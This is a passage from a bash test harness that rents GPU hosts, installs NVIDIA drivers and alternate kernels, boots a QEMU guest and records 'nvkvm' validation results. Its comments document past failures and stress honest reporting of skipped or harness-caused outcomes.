        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] SHA-256 mismatch after relaying guest image cache"
        return 2
    fi

    # setup_guest.sh binds cached checksums to their source URL.  Install that
    # exact format so it verifies the relayed bytes and skips the stalled route.
    if ! rsh_t 120 "printf '%s  %s\\n' '$want' '$GUEST_IMAGE_URL' > '$side_tmp' && chmod 0644 '$tmp' '$side_tmp' && mv -f '$tmp' '$remote' && mv -f '$side_tmp' '$remote.sha256'" >/dev/null 2>&1; then
        rsh_t 90 "rm -f '$tmp' '$side_tmp'" >/dev/null 2>&1
        GUEST_IMAGE_CACHE_DETAIL="[HARNESS] could not atomically install relayed guest image cache"
        return 2
    fi
    info "  guest image cache: relayed $GUEST_IMAGE_NAME (SHA-256 $want)"
    return 0
}

provision_box() {
    local step cmd tmo rc errs tail
    PROVISION_FAIL_DETAIL=""; PROVISION_FAILED_STEP=""

    # A one-time `systemctl stop unattended-upgrades` is not sufficient.  On
    # instance 48670339 build_qemu.sh completed, then apt-daily restarted and
    # setup_guest.sh failed on lock-frontend held by unattended-upgr.  Recheck
    # before every apt-using phase, with the timers runtime-masked and the lock
    # holder proven gone.
    if ! quiesce_host_apt; then
        PROVISION_FAIL_DETAIL="$HOST_APT_DETAIL"
        PROVISION_FAILED_STEP="apt-quiesce"
        return 1
    fi

    info "  shipping the tree"
    # `git status` deliberately ignores build products, so a plain tar ships
    # stale .o/.cmd files while still labelling the payload "clean HEAD".  A
    # guest then imports absolute Kbuild paths from another kernel/worktree.
    # Honour the repo's ignore rules at the shipment boundary as well.
    # mktemp, not a fixed /tmp/nvkvm-sweep-tree.tgz.  The old fixed name was in
    # world-writable /tmp with no O_EXCL, so a local user who pre-created it as
    # a symlink had the next sweep truncate and overwrite the target -- as the
    # user running the sweep, which on a coordinator is root.  It also meant two
    # concurrent sweeps silently shipped each other's tree, which is the more
    # likely of the two to actually happen here.
    TREE_TGZ="$(mktemp /tmp/nvkvm-sweep-tree.XXXXXX.tgz)" \
        || { PROVISION_FAIL_DETAIL="mktemp for the tree tarball failed"; PROVISION_FAILED_STEP="ship"; return 1; }
    tar --exclude-vcs-ignores --exclude=.git --exclude=sweep-runs \
        -czf "$TREE_TGZ" -C "$REPO" . 2>/dev/null \
        || { PROVISION_FAIL_DETAIL="could not tar the repo"; PROVISION_FAILED_STEP="ship"; return 1; }
    # The REMOTE name stays fixed: it lands in root's home on a box this sweep
    # rented and destroys, and the unpack step below names it literally.
    timeout 900 scp $SSH_OPTS -P "$SCP_PORT" -q "$TREE_TGZ" "root@$SCP_HOST:/root/nvkvm-sweep-tree.tgz" \
        || { PROVISION_FAIL_DETAIL="scp of the tree failed"; PROVISION_FAILED_STEP="ship"; return 1; }
    rsh_t 180 'mkdir -p /root/nvkvm && tar -xzf /root/nvkvm-sweep-tree.tgz -C /root/nvkvm' >/dev/null 2>&1 \
        || { PROVISION_FAIL_DETAIL="could not unpack the tree on the box"; PROVISION_FAILED_STEP="ship"; return 1; }

    # DEBIAN_FRONTEND / NEEDRESTART: apt must never be able to ask a question
    # here.  build_qemu.sh --install-deps once died on needrestart's interactive
    # "Services to be restarted" prompt and was recorded as a build failure -- a
    # harness result wearing the shape of an environment one.
    #
    # NVKVM_QEMU_UI is deliberately NOT set: this sweep is headless and
    # validate.sh needs no display.  If you ever do want one, note that
    # build_qemu.sh EXITS 0 WITHOUT REBUILDING when the binary already exists,
    # so adding the variable on a second run is a SILENT NO-OP -- it needs
    # --force as well.  That has wasted a full box cycle before.
    local ENVP='DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a NEEDRESTART_SUSPEND=1'
    for step in build guest; do
        if ! quiesce_host_apt; then
            PROVISION_FAIL_DETAIL="$HOST_APT_DETAIL"
            PROVISION_FAILED_STEP="apt-quiesce"
            return 1
        fi
        case "$step" in
            build) cmd="cd /root/nvkvm && $ENVP bash scripts/build_qemu.sh --install-deps"; tmo=3900 ;;
            guest) cmd="cd /root/nvkvm && $ENVP bash scripts/setup_guest.sh";               tmo=3000 ;;
        esac
        info "  $step ... (up to $((tmo/60))m)"
        rsh_t "$tmo" "$cmd > /root/$step.log 2>&1"; rc=$?
        if [ "$rc" != 0 ]; then
            errs="$(rsh_t 90 "grep -niE 'error|fatal|cannot|No space|Killed|undefined reference' /root/$step.log | tail -25" 2>/dev/null)"
            tail="$(rsh_t 90 "tail -60 /root/$step.log" 2>/dev/null)"
            PROVISION_FAIL_DETAIL="ERRORS:
$errs

TAIL:
$tail"
            PROVISION_FAILED_STEP="$step"
            return 1
        fi
        if [ "$step" = "build" ] && [ -n "$GUEST_IMAGE_CACHE" ]; then
            info "  guest image cache relay ..."
            if ! stage_cached_guest_image; then
                PROVISION_FAIL_DETAIL="$GUEST_IMAGE_CACHE_DETAIL"
                PROVISION_FAILED_STEP="guest-image-cache"
                return 1
            fi
        fi
    done
    return 0
}

# ---------------------------------------------------------------------------
# driver installation
#
# Delegated to sweep_matrix.install_driver(), which carries the expensive
# lessons and must stay the single implementation:
#   * the vast image ships HELD dpkg driver packages, not a .run install, so a
#     .run layered on top leaves a stale userspace and every consumer fails with
#     "Driver/library version mismatch" -- which looks exactly like an nvkvm bug
#   * the running kernel was built by gcc-12 while the image's default cc is
#     gcc-11, so every module build dies on -ftrivial-auto-var-init=zero and
#     reports only "the nvidia kernel module was not created"
#   * NVIDIA's CDN returns intermittent 403s to rented hosts; that is throttling,
#     not a missing file, and must never be written down as "NVIDIA stopped
#     publishing X"
#   * Blackwell and datacenter Hopper need -m=kernel-open
#
# Substitutes are gated HERE: an alternate may only stand in for a primary if
# nvkvm_abi_id_for_version() gives them the SAME profile.  Otherwise a fallback
# would quietly change what the row measures.
# ---------------------------------------------------------------------------
DRIVER_DETAIL=""
DRIVER_ACTUAL=""
DRIVER_CACHE_DETAIL=""

# Some NVIDIA CDN edges return HTTP 403 to otherwise healthy rented hosts.
# An optional coordinator-local cache lets the sweep relay the exact installer
# over the already-established SSH connection.  The coordinator only hashes
# and copies these bytes; it NEVER executes an NVIDIA runfile.  The untrusted
# KVM box verifies the makeself archive with --check before using it.
#
# Cache filenames are NVIDIA's canonical names:
#   NVIDIA-Linux-x86_64-610.43.02.run
# A transfer lands under a temporary name, is compared with the coordinator's
# SHA-256, and is renamed atomically.  A stale partial can therefore never look
# like a cache hit on the next attempt.
stage_cached_driver() {
    local ver="$1" src remote tmp want got
    DRIVER_CACHE_DETAIL=""
    [ -n "$DRIVER_CACHE_DIR" ] || return 1
    [[ "$ver" =~ ^[0-9]+([.][0-9]+){1,2}$ ]] || {
        DRIVER_CACHE_DETAIL="[HARNESS] refusing invalid driver-cache version '$ver'"
        return 2
    }
    src="$DRIVER_CACHE_DIR/NVIDIA-Linux-x86_64-$ver.run"
    [ -f "$src" ] || return 1
    [ -n "${SCP_HOST:-}" ] && [ -n "${SCP_PORT:-}" ] || {
        DRIVER_CACHE_DETAIL="[HARNESS] cannot relay cached driver $ver: no SSH endpoint"
        return 2
    }

    want="$(sha256sum -- "$src" 2>/dev/null | awk '{print $1}')"
    [[ "$want" =~ ^[0-9a-f]{64}$ ]] || {
        DRIVER_CACHE_DETAIL="[HARNESS] cannot hash cached driver: $src"
        return 2
    }
    remote="/root/nvkvm-driver-cache/NVIDIA-Linux-x86_64-$ver.run"
    got="$(rsh_t 120 "sha256sum '$remote' 2>/dev/null | awk '{print \$1}'" 2>/dev/null | tr -d '\r\n')"
    if [ "$got" = "$want" ]; then
        info "    driver cache: $ver already staged and SHA-256 matched"
        return 0
    fi

    rsh_t 120 'install -d -m 0700 /root/nvkvm-driver-cache' >/dev/null 2>&1 || {
        DRIVER_CACHE_DETAIL="[HARNESS] could not create the remote driver-cache directory"
        return 2
    }
    tmp="$remote.part.$$"
    timeout 1800 scp $SSH_OPTS -P "$SCP_PORT" -q -- "$src" "root@$SCP_HOST:$tmp" || {
        rsh_t 90 "rm -f '$tmp'" >/dev/null 2>&1
        DRIVER_CACHE_DETAIL="[HARNESS] scp failed while relaying cached driver $ver"
        return 2
    }
    got="$(rsh_t 300 "sha256sum '$tmp' 2>/dev/null | awk '{print \$1}'" 2>/dev/null | tr -d '\r\n')"
    if [ "$got" != "$want" ]; then
        rsh_t 90 "rm -f '$tmp'" >/dev/null 2>&1
        DRIVER_CACHE_DETAIL="[HARNESS] SHA-256 mismatch after relaying cached driver $ver"
        return 2
    fi
    rsh_t 120 "chmod 0700 '$tmp' && mv -f '$tmp' '$remote'" >/dev/null 2>&1 || {
        rsh_t 90 "rm -f '$tmp'" >/dev/null 2>&1
        DRIVER_CACHE_DETAIL="[HARNESS] could not atomically promote cached driver $ver"
        return 2
    }
    info "    driver cache: relayed $ver (SHA-256 $want)"
    return 0
}

install_driver() {
    local ver="$1" arch="$2" logfile="$3" alts="$4" want_abi="$5"
    local vetted="" a out lic cache_err=""
    DRIVER_DETAIL=""; DRIVER_ACTUAL=""; DRIVER_CACHE_DETAIL=""

    # MODULE FLAVOUR, not just version.  sweep_matrix.install_driver() has a
    # fast path -- "cur == ver, nothing to do" -- that compares only the
    # version string.  On Blackwell and datacenter Hopper the PROPRIETARY
    # module of the right version cannot bind to the GPU at all:
    #     NVRM: ... requires use of the NVIDIA open kernel modules.
    #     NVRM: GPU ...: RmInitAdapter failed! (0x22:0x56:884)
    # and the box then looks like it has no GPU.  Measured on an RTX 5060 with
    # the vast image's preinstalled 575.51.03, 2026-08-24.  So on an
    # open-module architecture, force a real install unless the LOADED module
    # is the open one; the open module reports "Dual MIT/GPL", the proprietary
    # one "NVIDIA".
    if arch_needs_open_module "$arch"; then
        lic="$(rsh_t 90 'modinfo nvidia 2>/dev/null | awk "/^license:/{print \$2, \$3}"' 2>/dev/null | tr -d '\r')"
        case "$lic" in
            *MIT*|*GPL*) ;;
            *) info "    $arch needs the OPEN kernel module; loaded module reports license='${lic:-none}'"
               info "    -> forcing a real install rather than trusting the version match" ;;
        esac
    fi

    for a in ${alts//,/ }; do
        [ -z "$a" ] && continue
        if [ "$(abi_expected "$a")" = "$want_abi" ]; then
            vetted="$vetted${vetted:+,}$a"
        else
            warn "    refusing alternate $a for $ver: it selects ABI $(abi_expected "$a"), not $want_abi"
        fi
    done

    # Stage the primary and any ABI-vetted substitutes before the helper
    # purges the working driver.  Missing cache entries are normal; an actual
    # relay failure is retained so a later CDN failure names both causes.
    for a in "$ver" ${vetted//,/ }; do
        stage_cached_driver "$a"
        case $? in
            0|1) ;;
            2) cache_err="${cache_err}${cache_err:+; }$DRIVER_CACHE_DETAIL" ;;
        esac
    done

    out="$(python3 - "$REPO" "$SSH" "$ver" "$arch" "$logfile" "$vetted" <<'PY'
import sys, os, json, importlib.util
repo, S, ver, arch, logfile, alts = sys.argv[1:7]
spec = importlib.util.spec_from_file_location(
    "sweep_matrix", os.path.join(repo, "scripts", "sweep_matrix.py"))
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
# Inject the vetted, same-profile alternates for versions the module does not
# already know about.  Never widen a list the module deliberately left EMPTY
# (575.51.03 is preinstalled-only and has no downloadable substitute).
if alts:
    cur = m.DRIVER_ALTS.get(ver)
    if cur is None:
        m.DRIVER_ALTS[ver] = [a for a in alts.split(",") if a]
    elif cur:
        for a in alts.split(","):
            if a and a not in cur:
                cur.append(a)
try:
    ok, detail, actual = m.install_driver(S, ver, arch, logfile)
except Exception as e:
    ok, detail, actual = False, "[HARNESS] install_driver raised: %s" % e, None
print("@@RESULT@@" + json.dumps({"ok": bool(ok), "detail": detail or "",
                                 "actual": actual or ""}))
PY
)" || { DRIVER_DETAIL="[HARNESS] the driver installer helper crashed outright"; return 1; }

    # The helper prints human progress before its result; take the marked line.
    out="$(printf '%s\n' "$out" | grep '^@@RESULT@@' | tail -1 | sed 's/^@@RESULT@@//')"
    [ -n "$out" ] || { DRIVER_DETAIL="[HARNESS] no result line from the installer helper"; return 1; }
    DRIVER_DETAIL="$(printf '%s' "$out" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("detail",""))' 2>/dev/null)"
    if [ -n "$cache_err" ] && [ -n "$DRIVER_DETAIL" ]; then
        DRIVER_DETAIL="$cache_err; $DRIVER_DETAIL"
    elif [ -n "$cache_err" ]; then
        DRIVER_DETAIL="$cache_err"
    fi
    DRIVER_ACTUAL="$(printf '%s' "$out" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("actual",""))' 2>/dev/null)"
    printf '%s' "$out" | python3 -c 'import json,sys; sys.exit(0 if json.load(sys.stdin).get("ok") else 1)' 2>/dev/null
}

# ---------------------------------------------------------------------------
# boot the guest and run tests/validate.sh
#
# THIS SCRIPT MUST NEVER EDIT tests/validate.sh.  Whatever that suite grows into
# (a real UVM exercise is being added to it separately), the sweep runs it and
# reports its verdict faithfully -- including its exit code, which distinguishes
# passed (0) from failed (1) from INCOMPLETE, checks were skipped (2).
# Recomputing that verdict as `fail == 0` would bank a run with skipped checks
# as a success, which is exactly what this sweep exists to prevent.
# ---------------------------------------------------------------------------
VR_STATUS=""; VR_DETAIL=""; VR_JSON=""; VR_ABI=""; VR_SUMMARY=""; VR_WARNINGS=""; VR_RC=""; VR_FAILED=""

# A transient unit name is reused for every driver on the box.  `journalctl -u`
# therefore grows monotonically: after N driver boots it contains the DENY/AUDIT
# lines from all N.  Reporting that as the Nth driver's warning set silently
# misattributes controls to the wrong NVIDIA branch.  Select one systemd
# invocation, and validate the identifier before interpolating it into a remote
# shell command.
invocation_journal_query() {
    local inv="${1:-}"
    [[ "$inv" =~ ^[0-9A-Fa-f]{32}$ ]] || return 1
    printf 'journalctl _SYSTEMD_INVOCATION_ID=%s' "$inv"
}

boot_and_validate() {
    local drv="$1" gpu="$2" rc bundles G mod out booted=0 vm_inv vm_journal
    VR_STATUS=""; VR_DETAIL=""; VR_JSON=""; VR_ABI=""; VR_SUMMARY=""; VR_WARNINGS=""; VR_RC=""; VR_FAILED=""

    # The host-libs bundle is the HOST DRIVER's userspace and MUST be rebuilt
    # after every swap.  Staging a 580 bundle against a 535 kernel module fails
    # in ways that look like an nvkvm bug and are not.  Remove the previous
    # bundles first: stage_guest_libs.sh refuses to guess between several and
    # exits 1 having staged nothing.
    rsh_t 120 'rm -rf /root/nvkvm/host-libs-*' >/dev/null 2>&1
    rsh_t 700 'cd /root/nvkvm && bash scripts/make_host_bundle.sh > /root/bundle.log 2>&1'
    rc=$?
    if [ "$rc" != 0 ]; then
        VR_STATUS="bundle-failed"
        VR_DETAIL="$(rsh_t 90 'tail -30 /root/bundle.log' 2>/dev/null)"
        return
    fi
    bundles="$(rsh_t 90 'ls -d /root/nvkvm/host-libs-* 2>/dev/null | tr "\n" " "' 2>/dev/null | tr -d '\r')"
    case "$bundles" in
        *"host-libs-$drv"*) ;;
        *) VR_STATUS="bundle-failed"
           VR_DETAIL="expected exactly one bundle host-libs-$drv, found: ${bundles:-(none)}"
           return ;;
    esac

    rsh_t 120 'systemctl stop nvkvm-vm 2>/dev/null; true' >/dev/null 2>&1

    # sshpass IS THE ONLY WAY INTO THE GUEST, so its install must not be a
    # fire-and-forget.  provision_box() masks unattended-upgrades once, but it
    # comes back -- reliably so after a .run driver install -- and then takes
    # the dpkg lock:
    #     E: Could not get lock /var/lib/dpkg/lock-frontend.
    #        It is held by process NNNNN (unattended-upgr)
    # With the old `apt-get ... >/dev/null 2>&1` the failure vanished, every
    # guest probe failed for want of the binary, and 30 polls later the run
    # recorded `guest-no-boot` against a guest that had booted fine.  Measured
    # on an RTX 5060 box, 2026-08-24.  Re-assert the mask, then retry while the
    # lock clears, then say so plainly if it still is not there.
    if ! quiesce_host_apt; then
        VR_STATUS="host-apt-busy"
        VR_DETAIL="$HOST_APT_DETAIL"
        return
    fi
    if ! rsh_t 120 'command -v sshpass >/dev/null' >/dev/null 2>&1; then
        for _ in 1 2 3 4 5 6 7 8; do
            rsh_t 240 'DEBIAN_FRONTEND=noninteractive apt-get install -y -q sshpass' >/dev/null 2>&1
            rsh_t 90 'command -v sshpass >/dev/null' >/dev/null 2>&1 && break
            sleep 15
        done
    fi
    if ! rsh_t 90 'command -v sshpass >/dev/null' >/dev/null 2>&1; then
        VR_STATUS="sshpass-missing"
        VR_DETAIL="$(rsh_t 90 'DEBIAN_FRONTEND=noninteractive apt-get install -y -q sshpass 2>&1 | tail -6' 2>/dev/null)"
        return
    fi

    rsh_t 200 'systemd-run --unit=nvkvm-vm --collect --setenv=VM_MEM=8G --setenv=VM_SMP=4 --working-directory=/root/nvkvm bash scripts/run_test_vm.sh' >/dev/null 2>&1

    vm_inv="$(rsh_t 90 'systemctl show nvkvm-vm.service --property=InvocationID --value 2>/dev/null' 2>/dev/null | tr -d '\r\n')"
    if ! vm_journal="$(invocation_journal_query "$vm_inv")"; then
        VR_STATUS="vm-journal-scope-missing"
        VR_DETAIL="[HARNESS] nvkvm-vm has no valid systemd InvocationID; refusing to attribute cumulative unit logs to driver $drv"
        return
    fi

    G='sshpass -p ubuntu ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 ubuntu@localhost'
    for _ in $(seq 1 30); do
        out="$(rsh_t 90 "$G 'mountpoint -q /mnt/nvkvm && echo MOUNTED'" 2>/dev/null)"
        case "$out" in *MOUNTED*) booted=1; break ;; esac
        sleep 20
    done
    if [ "$booted" != 1 ]; then
        VR_STATUS="guest-no-boot"
        VR_DETAIL="$(rsh_t 90 "$vm_journal --no-pager 2>/dev/null | tail -40" 2>/dev/null)"
        return
    fi

    # /mnt/nvkvm being mounted is NOT a readiness signal.  The mount is done by
    # cloud-init runcmd while nvkvm-guest.service is a oneshot ordered only
    # After=local-fs.target, so it can fire before its inputs exist and, with
    # RemainAfterExit, never retry.  Racing validate.sh against that produced
    # identical pass/fail counts on cards that differ -- which reads like a GPU
    # verdict and is not one.
    rsh_t 1300 "$G 'sudo cloud-init status --wait'" >/dev/null 2>&1
    rsh_t 1300 "$G 'sudo systemctl restart nvkvm-guest.service'" >/dev/null 2>&1
    mod="$(rsh_t 120 "$G 'lsmod | grep -q nvkvm_guest && echo LOADED || echo NOMODULE'" 2>/dev/null)"
    case "$mod" in
        *LOADED*) ;;
        *) VR_STATUS="guest-module-not-loaded"
           VR_DETAIL="$(rsh_t 120 "$G 'sudo journalctl -u nvkvm-guest.service --no-pager 2>&1 | tail -25'" 2>/dev/null)"
           return ;;
    esac

    # THE ABI PROFILE LINE.  QEMU prints, at realize:
    #     nvkvm: host driver <version> → ABI profile <n>
    # This is the single most valuable field in a driver sweep -- the profile
    # table is precisely what a new driver version breaks -- so it is captured
    # and reported for every driver, pass or fail.
    VR_ABI="$(rsh_t 120 "$vm_journal --no-pager 2>/dev/null | grep -oE 'ABI profile [0-9]+' | tail -1" 2>/dev/null | awk '{print $NF}' | tr -d '\r')"
    [ -z "$VR_ABI" ] && VR_ABI="?"

    # stage_guest_libs.sh exits 2 when an OPTIONAL library is missing (recorded,
    # not fatal) but 1 when it staged NOTHING AT ALL.  A run that staged nothing
    # then fails validate.sh for reasons with nothing to do with the GPU.  Pass
    # the bundle explicitly so there is no guess left to get wrong.
    rsh_t 700 "$G 'sudo bash /mnt/nvkvm/scripts/stage_guest_libs.sh /mnt/nvkvm/host-libs-$drv' 2>&1" >/dev/null 2>&1
    if [ $? = 1 ]; then
        VR_STATUS="stage-failed"
        VR_DETAIL="stage_guest_libs.sh staged nothing at all (rc=1)"
        return
    fi

    # --expect-driver is a real assertion, not decoration: it is what catches a
    # driver swap that silently did not take, which is the failure mode that
    # would otherwise let ONE version be measured five times and reported as
    # five drivers' worth of coverage.
    rsh_t 2000 "$G 'cd /mnt/nvkvm && bash tests/validate.sh --expect-driver $drv --json /tmp/r.json'" >/dev/null 2>&1
    VR_RC=$?
    VR_JSON="$(rsh_t 120 "$G 'cat /tmp/r.json'" 2>/dev/null)"

    # Collect the early-warning lines EVEN ON A PASS.  Every real bug found on
    # new hardware announced itself here first, and a green table with a DENY
    # line hidden behind it is how those get missed.
    #   QEMU stderr : nvkvm: DENY {drm ioctl,frontend ioctl,alloc class,ctrl cmd}
    #   guest dmesg : nvkvm: AUDIT unknown ioctl ...
    #                 nvkvm: AUDIT param_size MISMATCH ...   (the alloc-size warning)
    VR_WARNINGS="$(
        rsh_t 120 "$vm_journal --no-pager 2>/dev/null | grep -aoE 'nvkvm: (DENY|AUDIT)[^\"]{0,90}' | sort | uniq -c | sort -rn | head -40" 2>/dev/null
        rsh_t 120 "$G 'sudo dmesg 2>/dev/null | grep -aoE \"nvkvm: (AUDIT|DENY)[^\\\"]{0,90}\" | sort | uniq -c | sort -rn | head -40'" 2>/dev/null
    )"

    if [ -z "$VR_JSON" ]; then
        VR_STATUS="validate-unparsed"
        VR_DETAIL="validate.sh exited $VR_RC but produced no /tmp/r.json"
        return
    fi
    VR_SUMMARY="$(printf '%s' "$VR_JSON" | python3 -c '
import json,sys
try: v = json.load(sys.stdin)
except Exception: sys.exit(0)
print("%sP/%sF/%sS" % (v.get("pass","?"), v.get("fail","?"), v.get("skip","?")))
' 2>/dev/null)"
    # The count alone is not diagnosable. Keep the NAMES of the checks that
    # failed (and of skips, which is how a failing check cascades into a dozen
    # "S"), so a red row can be read after the box is gone.
    VR_FAILED="$(printf '%s' "$VR_JSON" | python3 -c '
import json,sys
try: v = json.load(sys.stdin)
except Exception: sys.exit(0)
bad = [c.get("name","?") for c in v.get("checks",[]) if c.get("status") == "FAIL"]
first_skip = [c.get("name","?") for c in v.get("checks",[]) if c.get("status") == "SKIP"][:3]
out = ",".join(bad)
if first_skip: out += "  (skipped after: " + ",".join(first_skip) + ")"
print(out)
' 2>/dev/null)"
    case "$VR_RC" in
        0) VR_STATUS="pass" ;;
        1) VR_STATUS="fail" ;;
        2) VR_STATUS="incomplete" ;;   # skips: NOT silently banked as a pass
        *) VR_STATUS="validate-rc-$VR_RC" ;;
    esac
}

# ---------------------------------------------------------------------------
# boot the box on a DIFFERENT host kernel, then prove it took
# ---------------------------------------------------------------------------
# ABI profiles 515/525/535 cannot be swept on the stock vast image: those
# drivers predate kernel API changes (get_user_pages_remote's signature, among
# others) and their modules simply will not compile against the 6.8 HWE kernel
# the image runs.  MEASURED 2026-08-30: 515.43.04 dies in nv-mm.h with "too many
# arguments to function 'get_user_pages_remote'".  88 of 216 published tags sit
# behind those three profiles.
#
# Ubuntu 22.04's GA kernel is 5.15, and the image carries HWE on top of it, so
# the old kernel is one apt away.  Install it, point GRUB at it, reboot, and --
# this is the load-bearing part -- VERIFY the box came back on the kernel we
# asked for.  Continuing on the wrong kernel would silently produce
# "driver-install-failed" rows that look like driver verdicts and are not.
boot_kernel_series() {
    local want="$1" cur got have
    cur="$(rsh_t 60 'uname -r' 2>/dev/null | tr -d '\r')"
    case "$cur" in
        "$want"*) info "  host kernel already $cur -- no reboot needed"; return 0 ;;
    esac
    info "  switching host kernel: $cur -> ${want}.x (needed for pre-550 drivers)"

    rsh_t 900 "DEBIAN_FRONTEND=noninteractive apt-get update -qq && \
               DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
               linux-image-generic linux-headers-generic" >/dev/null 2>&1 \
        || { warn "  apt could not install the GA kernel"; return 1; }

    # PREFER THE -generic FLAVOUR.  MEASURED 2026-08-30: picking merely "the
    # newest 5.15" lands on 5.15.0-1079-kvm, because sort -V ranks 1079 above
    # 190 -- and the -kvm flavour cannot build these drivers at all:
    #   modpost: "backlight_device_register" [nvidia-modeset.ko] undefined!
    #   modpost: GPL-incompatible module nvidia.ko uses GPL-only symbol
    #            'rcu_read_unlock_strict'
    # Both are properties of that flavour's config, not of 5.15, and headers
    # were present -- so this looked like "the old driver still will not build"
    # when it was the wrong kernel flavour.  Fall back to any match only if no
    # -generic exists, and say so.
    have="$(rsh_t 120 "ls -1 /boot/vmlinuz-${want}*-generic 2>/dev/null | sed 's|.*/vmlinuz-||' | sort -V | tail -1" 2>/dev/null | tr -d '\r')"
    if [ -z "$have" ]; then
        have="$(rsh_t 120 "ls -1 /boot/vmlinuz-${want}* 2>/dev/null | sed 's|.*/vmlinuz-||' | sort -V | tail -1" 2>/dev/null | tr -d '\r')"
        [ -n "$have" ] && warn "  no ${want}-generic kernel; falling back to ${have}, which may not build these drivers"
    fi
    [ -n "$have" ] || { warn "  no /boot/vmlinuz-${want}* after apt install"; return 1; }
    info "  installed ${have}; removing the HWE kernel so GRUB has one choice"

    # Deliberately blunt: rather than construct a GRUB menuentry id (nested
    # grub-probe inside sed inside ssh -- fragile quoting that fails in the
    # field, not in testing), remove every OTHER kernel so the default is the
    # only one left.  Purging the running kernel is safe here: the files stay
    # mapped until reboot, and the box is disposable.
    #
    # PURGE BY EXCLUSION, NOT BY GLOB.  MEASURED 2026-08-30: globbing
    # 'linux-image-*-generic' and the hwe metapackages left the -kvm flavour
    # installed ("kernels present after cleanup: 2"), GRUB booted
    # 5.15.0-1079-kvm over 5.15.0-190-generic because 1079 sorts higher, and the
    # drivers failed to build exactly as before -- with the log claiming GRUB had
    # one choice.  Enumerate what dpkg actually has and drop everything that is
    # not the kernel we picked.
    rsh_t 900 "DEBIAN_FRONTEND=noninteractive apt-get purge -y -qq \
               \$(dpkg-query -W -f='\${Package}\n' 'linux-image-*' 'linux-headers-*' 2>/dev/null \
                  | grep -v -- '${have}' | tr '\n' ' ') 2>/dev/null; \
               update-grub" >/dev/null 2>&1 \
        || { warn "  could not isolate ${have} as the only installed kernel"; return 1; }

    got="$(rsh_t 120 "ls -1 /boot/vmlinuz-* 2>/dev/null | wc -l" 2>/dev/null | tr -d '\r')"
    info "  kernels present after cleanup: ${got:-?}"

    info "  rebooting onto ${have}"
    rsh_t 60 'nohup sh -c "sleep 1; reboot" >/dev/null 2>&1 &' >/dev/null 2>&1 || true
    sleep 25
    local n=0
    until rsh_t 30 'true' >/dev/null 2>&1; do
        n=$((n+1)); [ "$n" -ge 60 ] && { warn "  box never came back after reboot"; return 1; }
        sleep 10
    done
    got="$(rsh_t 60 'uname -r' 2>/dev/null | tr -d '\r')"
    case "$got" in
        "$want"*)
            # Landing on ${want}.x is necessary but NOT sufficient: the -kvm
            # flavour is a ${want} kernel that still cannot build these drivers
            # (no backlight class, GPL-only rcu symbol).  Refuse it explicitly
            # rather than produce driver-install-failed rows that read like
            # driver verdicts.
            case "$got" in
                *-generic) info "  host kernel is now $got"; return 0 ;;
                *) warn "  landed on $got -- not a -generic flavour, which cannot build pre-550 drivers"
                   return 1 ;;
            esac ;;
        *) warn "  reboot landed on $got, not ${want}.x -- refusing to sweep on the wrong kernel"
           return 1 ;;
    esac
}

# ---------------------------------------------------------------------------
# which NVIDIA kernel-module flavour is loaded RIGHT NOW
# ---------------------------------------------------------------------------
# A sweep that cannot say whether it tested the proprietary module or the open
# one (OGKM) is missing the most basic fact about what it measured.  This was
# previously queried only for OPEN_MODULE_ARCHES, so ampere/turing/ada rows
# recorded nothing at all and the flavour had to be INFERRED from the installer
# attempt order.  Record it instead.
#   "Dual MIT/GPL" -> open (OGKM)      "NVIDIA" -> proprietary
module_flavour() {
    local lic
    lic="$(rsh_t 90 'modinfo nvidia 2>/dev/null | awk "/^license:/{\$1=\"\"; print}"' 2>/dev/null | tr -d '\r' | tr -s ' ')"
    case "$lic" in
        *MIT*|*GPL*) printf 'open' ;;
        *NVIDIA*)    printf 'proprietary' ;;
        *)           printf 'unknown' ;;
    esac
}

# ---------------------------------------------------------------------------
# raw log collection -- the box is about to be destroyed and takes its logs with
# it unless they are pulled off first
# ---------------------------------------------------------------------------
collect_logs() {
    local dest="$1"
    [ -n "${SCP_HOST:-}" ] && [ -n "${SCP_PORT:-}" ] || {
        warn "collect_logs: no ssh endpoint -- nothing to pull"; return 0; }
    mkdir -p "$dest"
    timeout 300 scp $SSH_OPTS -P "$SCP_PORT" -q \
        "root@$SCP_HOST:/root/build.log" "root@$SCP_HOST:/root/guest.log" \
        "root@$SCP_HOST:/root/bundle.log" "root@$SCP_HOST:/root/drv-"*.log \
        "$dest/" 2>/dev/null
    rsh_t 180 'journalctl -u nvkvm-vm --no-pager 2>/dev/null | tail -3000' >"$dest/qemu-nvkvm-vm.log" 2>/dev/null
    return 0
}

# ---------------------------------------------------------------------------
# results ledger + resumability
# ---------------------------------------------------------------------------
RESULTS=""
emit() { printf '%s\n' "$1" >>"$RESULTS"; sync 2>/dev/null || true; }

# A unit is (architecture, driver).  On resume, a unit that reached a TERMINAL
# status is not paid for again.  The split is deliberate:
#   terminal  pass / fail / incomplete / driver-predates-gpu
#             -- these are ANSWERS.  Re-running them buys nothing.
#   retryable everything else (install failed, no box, guest never booted)
#             -- these are the harness or the market failing, and a re-run is
#             exactly what should happen.
unit_done() {
    local arch="$1" drv="$2"
    [ -f "$RESULTS" ] || return 1
    python3 - "$RESULTS" "$arch" "$drv" <<'PY'
import json, sys
path, arch, drv = sys.argv[1:4]
TERMINAL = {"pass", "fail", "incomplete", "driver-predates-gpu"}
for line in open(path):
    line = line.strip()
    if not line: continue
    try: r = json.loads(line)
    except Exception: continue
    if r.get("arch") == arch and r.get("driver") == drv and r.get("status") in TERMINAL:
        raise SystemExit(0)
raise SystemExit(1)
PY
}

# ---------------------------------------------------------------------------
# one box: acquire, provision, sweep every applicable driver, destroy
# ---------------------------------------------------------------------------
BOX_UNTESTED=0
BOX_FAILED=0
BOX_TESTED=0

sweep_one_box() {
    local arch="$1"
    local offer_line offer_id machine gpu dph geo inet advdrv rc logdir
    local ndrv projected out iid box_status t_start t_end elapsed cost preinstalled

    offer_line="$(pick_offer "$arch")" || {
        warn "no rentable KVM offer for arch=$arch under \$$MAX_DPH/hr"
        emit "$(jrec arch "$arch" driver "-" status "no-offer" \
                detail "no rentable vms_enabled offer for this architecture under the price cap (machines already tried this run and the known-bad list are excluded)" \
